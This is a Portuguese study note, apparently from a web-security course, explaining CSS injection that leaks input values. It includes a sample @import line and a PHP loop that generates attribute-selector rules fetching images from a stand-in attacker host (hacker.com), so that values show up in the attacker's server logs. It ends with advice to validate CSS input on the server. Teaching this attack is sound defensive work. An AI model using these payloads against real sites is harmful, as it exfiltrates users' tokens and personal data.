# Deep Explanation: CSS Sniffer

## Por que CSS e perigoso

A maioria dos desenvolvedores se preocupa com XSS (JavaScript) e injecao de HTML, mas ignora completamente CSS como vetor de ataque. O instrutor enfatiza: **"a gente geralmente se preocupa com HTML, vai se preocupar com JavaScript, mas CSS, ne?"**

O ponto crucial e que CSS nao precisa executar codigo para ser perigoso. Nao ha execucao arbitraria de codigo, nao ha comportamento malicioso na maquina do usuario — mas ha **vazamento de informacao** (problema de privacidade).

## O cliente e territorio do hacker

Frase-chave do instrutor: **"lembra, o client e o territorio do hacker"**. O usuario pode:
- Abrir o DevTools
- Trocar `input type="color"` por `input type="text"` ou `textarea`
- Inserir CSS completo onde o formulario esperava apenas um valor de cor
- Enviar qualquer payload, ignorando validacoes client-side

Isso significa que qualquer validacao de formato feita apenas no front-end e inutil contra um atacante.

## Cenarios comuns de injecao CSS

O instrutor lista tres cenarios reais que ja viu em producao:

1. **Campo "CSS customizado"** — aplicacoes que oferecem uma caixa de texto para o usuario digitar CSS que sera incluido no header das paginas
2. **Nome de tema sem validacao** — o valor e usado em `@import url(theme-name.css)` mas nao e validado, permitindo URLs externas
3. **Input de cor sem validacao server-side** — o campo envia um valor que deveria ser hex mas o servidor nao valida

## Mecanica do ataque

### Passo 1: Injecao via @import
O atacante injeta `@import url("http://hacker.com/inject.php")` no CSS da pagina.

### Passo 2: PHP gera CSS dinamico
O arquivo `inject.php` retorna CSS com `Content-Type: text/css`. Ele gera milhares de regras CSS, uma para cada valor possivel:

```php
for ($i = 0; $i < 10000; $i++) {
    echo "input[value=\"$i\"] { background: url(\"http://hacker.com/$i.png\"); }\n";
}
```

### Passo 3: Navegador faz a requisicao
Quando o navegador renderiza a pagina, o input com `value="1234"` corresponde a regra `input[value="1234"]`. O navegador tenta carregar `http://hacker.com/1234.png`.

### Passo 4: Logs do servidor revelam o valor
O atacante olha os logs do seu servidor e ve qual imagem foi requisitada — revelando o valor secreto.

### Impacto no usuario
**Zero.** O usuario nao percebe nada. "So deu uma piscadinha, ele carregou e tudo mais, ele pegou o token que ele tem que usar." Enquanto isso, o atacante ja tem o valor.

## Sofisticacao possivel

O instrutor menciona que o ataque pode ficar mais sofisticado usando **expressoes de query de atributo do CSS**:

- `input[value^="0"]` — valor comeca com "0"
- `input[value^="01"]` — valor comeca com "01"
- `input[value$="01"]` — valor termina com "01"

Com analise combinatoria, e possivel reconstruir valores alfanumericos completos (logins, emails, tokens de API).

Alem disso, CSS tem **filtros de conteudo** — nao apenas seletores de atributo. Isso significa que texto visivel na pagina tambem pode ser exfiltrado.

## Principio fundamental

**"O mesmo tipo de cuidado que voce tem com HTML e com JavaScript, tem que ter com CSS tambem."**

Qualquer entrada do usuario que sera transformada em CSS deve ser validada no servidor com o mesmo rigor aplicado a prevencao de XSS.